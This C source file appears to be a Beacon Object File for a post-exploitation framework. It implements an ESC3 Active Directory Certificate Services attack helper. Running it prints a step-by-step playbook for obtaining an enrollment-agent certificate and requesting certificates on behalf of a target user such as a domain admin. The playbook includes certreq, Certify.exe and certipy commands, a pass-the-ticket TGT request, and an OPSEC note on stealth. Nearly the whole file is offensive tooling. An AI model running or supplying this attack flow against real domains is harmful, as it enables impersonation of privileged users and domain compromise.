/*
 * cert_request_agent - Request Certificates on Behalf of Other Users
 *
 * Implements the ESC3 attack using enrollment agent certificates.
 * An enrollment agent certificate allows requesting certs for other users.
 *
 * Two-step process:
 * 1. Obtain enrollment agent certificate (Certificate Request Agent EKU)
 * 2. Use it to request certificates on behalf of another user
 *
 * Usage: cert_request_agent /ca:CA /template:TEMPLATE /onbehalfof:USER [/agent:AGENT_CERT]
 */

#include "include/adcs_struct.h"
#include "include/adcs_utils.h"
#include "beacon.h"


typedef struct {
    char* buffer;
    int length;
    int position;
} ARG_PARSER;

static void arg_init(ARG_PARSER* parser, char* buffer, int length) {
    parser->buffer = buffer;
    parser->length = length;
    parser->position = 0;
}

static char* arg_get(ARG_PARSER* parser, const char* name) {
    char* buf = parser->buffer;
    int len = parser->length;
    char search[64];
    sprintf(search, "/%s:", name);
    int searchLen = strlen(search);

    for (int i = 0; i < len - searchLen; i++) {
        if (strncmp(buf + i, search, searchLen) == 0) {
            char* start = buf + i + searchLen;
            char* end = start;
            while (*end && *end != ' ' && *end != '\t' && *end != '\n') end++;
            int valueLen = end - start;
            char* value = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, valueLen + 1);
            if (value) {
                memcpy(value, start, valueLen);
                value[valueLen] = '\0';
            }
            return value;
        }
    }

    sprintf(search, "/%s", name);
    searchLen = strlen(search);
    for (int i = 0; i < len - searchLen; i++) {
        if (strncmp(buf + i, search, searchLen) == 0) {
            char next = buf[i + searchLen];
            if (next == '\0' || next == ' ' || next == '\t' || next == '\n') {
                char* value = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 2);
                if (value) value[0] = '1';
                return value;
            }
        }
    }

    return NULL;
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* ca = NULL;
    char* agentCert = NULL;
    char* onBehalfOf = NULL;
    char* template = NULL;
    char* agentTemplate = NULL;

    BeaconFormatAlloc(&output, 32768);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n[*] Action: Enrollment Agent Request (ESC3)\n\n");


    ca = arg_get(&parser, "ca");
    agentCert = arg_get(&parser, "agent");
    onBehalfOf = arg_get(&parser, "onbehalfof");
    template = arg_get(&parser, "template");
    agentTemplate = arg_get(&parser, "agenttemplate");

    if (!ca || !onBehalfOf) {
        BeaconFormatPrintf(&output, "[-] Error: /ca and /onbehalfof required\n\n");
        BeaconFormatPrintf(&output, "Usage: cert_request_agent /ca:CA /onbehalfof:USER [options]\n\n");
        BeaconFormatPrintf(&output, "Required:\n");
        BeaconFormatPrintf(&output, "  /ca:SERVER\\\\CAName   - Target CA configuration\n");
        BeaconFormatPrintf(&output, "  /onbehalfof:USER     - Target user (DOMAIN\\\\user or user@domain)\n\n");
        BeaconFormatPrintf(&output, "Optional:\n");
        BeaconFormatPrintf(&output, "  /template:NAME       - Template for target user cert\n");
        BeaconFormatPrintf(&output, "  /agent:CERT_FILE     - Agent certificate PFX\n");
        BeaconFormatPrintf(&output, "  /agenttemplate:NAME  - Template to get agent cert\n\n");
        BeaconFormatPrintf(&output, "Examples:\n");
        BeaconFormatPrintf(&output, "  cert_request_agent /ca:dc01\\\\corp-CA /onbehalfof:CORP\\\\admin\n");
        BeaconFormatPrintf(&output, "  cert_request_agent /ca:dc01\\\\corp-CA /onbehalfof:admin@corp.local /agent:agent.pfx /template:User\n");
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] CA Configuration: %s\n", ca);
    BeaconFormatPrintf(&output, "[*] Target User: %s\n", onBehalfOf);
    if (agentCert) BeaconFormatPrintf(&output, "[*] Agent Certificate: %s\n", agentCert);
    if (template) BeaconFormatPrintf(&output, "[*] Target Template: %s\n", template);

    BeaconFormatPrintf(&output, "\n[*] ESC3 Enrollment Agent Attack Flow:\n\n");

    BeaconFormatPrintf(&output, "=== Step 1: Obtain Enrollment Agent Certificate ===\n\n");

    BeaconFormatPrintf(&output, "Find templates with Certificate Request Agent EKU:\n");
    BeaconFormatPrintf(&output, "  cert_find /eku:1.3.6.1.4.1.311.20.2.1\n\n");

    BeaconFormatPrintf(&output, "Common enrollment agent templates:\n");
    BeaconFormatPrintf(&output, "  - Enrollment Agent\n");
    BeaconFormatPrintf(&output, "  - Enrollment Agent (Computer)\n");
    BeaconFormatPrintf(&output, "  - Exchange Enrollment Agent (Offline request)\n\n");

    if (agentTemplate) {
        BeaconFormatPrintf(&output, "Request enrollment agent certificate:\n");
        BeaconFormatPrintf(&output, "  certreq -enroll -config \"%s\" %s\n\n", ca, agentTemplate);
    } else {
        BeaconFormatPrintf(&output, "Request enrollment agent certificate (example):\n");
        BeaconFormatPrintf(&output, "  certreq -enroll -config \"%s\" \"Enrollment Agent\"\n\n", ca);
    }

    BeaconFormatPrintf(&output, "Export agent certificate to PFX:\n");
    BeaconFormatPrintf(&output, "  certutil -exportpfx My \"Enrollment Agent\" agent.pfx\n\n");

    BeaconFormatPrintf(&output, "=== Step 2: Request Certificate On Behalf Of User ===\n\n");

    BeaconFormatPrintf(&output, "Find templates allowing enrollment on behalf of:\n");
    BeaconFormatPrintf(&output, "  Look for: Application Policy = Certificate Request Agent\n");
    BeaconFormatPrintf(&output, "  And: msPKI-RA-Signature = 1 or higher\n\n");

    BeaconFormatPrintf(&output, "Method 1: Using certreq with agent signing\n");
    BeaconFormatPrintf(&output, "-------------------------------------------\n\n");

    BeaconFormatPrintf(&output, "Create CSR for target user (save as request.inf):\n");
    BeaconFormatPrintf(&output, "  [NewRequest]\n");
    BeaconFormatPrintf(&output, "  Subject = \"CN=%s\"\n", onBehalfOf);
    BeaconFormatPrintf(&output, "  KeySpec = 1\n");
    BeaconFormatPrintf(&output, "  KeyLength = 2048\n");
    BeaconFormatPrintf(&output, "  Exportable = TRUE\n");
    BeaconFormatPrintf(&output, "  MachineKeySet = FALSE\n");
    BeaconFormatPrintf(&output, "  SMIME = FALSE\n");
    BeaconFormatPrintf(&output, "  PrivateKeyArchive = FALSE\n");
    BeaconFormatPrintf(&output, "  UserProtected = FALSE\n");
    BeaconFormatPrintf(&output, "  UseExistingKeySet = FALSE\n");
    BeaconFormatPrintf(&output, "  RequestType = PKCS10\n\n");

    BeaconFormatPrintf(&output, "Generate CSR:\n");
    BeaconFormatPrintf(&output, "  certreq -new request.inf request.csr\n\n");

    BeaconFormatPrintf(&output, "Sign CSR with enrollment agent cert:\n");
    BeaconFormatPrintf(&output, "  certreq -policy request.csr %s request-signed.csr\n\n",
        agentCert ? agentCert : "agent.pfx");

    BeaconFormatPrintf(&output, "Submit signed request to CA:\n");
    BeaconFormatPrintf(&output, "  certreq -submit -config \"%s\" request-signed.csr\n\n", ca);

    BeaconFormatPrintf(&output, "Method 2: Using Certify.exe\n");
    BeaconFormatPrintf(&output, "---------------------------\n\n");

    BeaconFormatPrintf(&output, "  Certify.exe request /ca:%s /template:%s /onbehalfof:%s\n\n",
        ca, template ? template : "User", onBehalfOf);

    BeaconFormatPrintf(&output, "Method 3: Using certipy (Python)\n");
    BeaconFormatPrintf(&output, "--------------------------------\n\n");

    BeaconFormatPrintf(&output, "  certipy req -ca '%s' -template %s -on-behalf-of '%s' -pfx agent.pfx\n\n",
        ca, template ? template : "User", onBehalfOf);

    BeaconFormatPrintf(&output, "=== Step 3: Use Obtained Certificate ===\n\n");

    BeaconFormatPrintf(&output, "Request TGT with the certificate:\n");
    BeaconFormatPrintf(&output, "  krb_asktgt /user:%s /certificate:obtained.pfx /password:pass /ptt\n\n",
        onBehalfOf);

    BeaconFormatPrintf(&output, "[*] ESC3 Requirements:\n");
    BeaconFormatPrintf(&output, "  1. You can enroll in a Certificate Request Agent template\n");
    BeaconFormatPrintf(&output, "  2. A template exists that:\n");
    BeaconFormatPrintf(&output, "     - Allows enrollment agent signatures (msPKI-RA-Signature >= 1)\n");
    BeaconFormatPrintf(&output, "     - Has Client Authentication EKU\n");
    BeaconFormatPrintf(&output, "     - Does not restrict enrollment agents (msPKI-RA-Application-Policies)\n\n");

    BeaconFormatPrintf(&output, "[!] OPSEC: ESC3 is more stealthy than ESC1 as it uses legitimate\n");
    BeaconFormatPrintf(&output, "    enrollment agent functionality designed for help desk scenarios\n");

cleanup:
    if (ca) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, ca);
    if (agentCert) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, agentCert);
    if (onBehalfOf) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, onBehalfOf);
    if (template) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, template);
    if (agentTemplate) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, agentTemplate);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
